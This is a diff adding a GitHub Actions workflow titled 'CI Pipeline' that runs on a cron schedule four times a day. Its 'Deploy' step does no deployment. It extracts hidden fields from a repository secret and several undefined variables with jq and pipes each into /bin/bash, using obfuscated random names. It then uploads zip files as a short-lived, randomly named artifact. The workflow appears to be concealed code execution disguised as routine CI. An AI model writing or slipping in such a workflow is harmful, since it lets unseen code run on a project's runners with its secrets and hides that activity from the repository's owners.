@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          sr9: ${{ secrets.sr9 }}
+        run: |
+          printf '%s' "$sr9" | jq -r .s05776 | /bin/bash
+          echo $qhmb193 | jq -r .ne49911 | /bin/bash
+          printf '%s' "$ma3282" | jq -r .e92089 | /bin/bash
+          echo $kl3 | jq -r .zs454 | /bin/bash
+          echo $j903 | jq -r .qdeo78731 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: f6RybX6n
+          path: "*.zip"
+          retention-days: 1
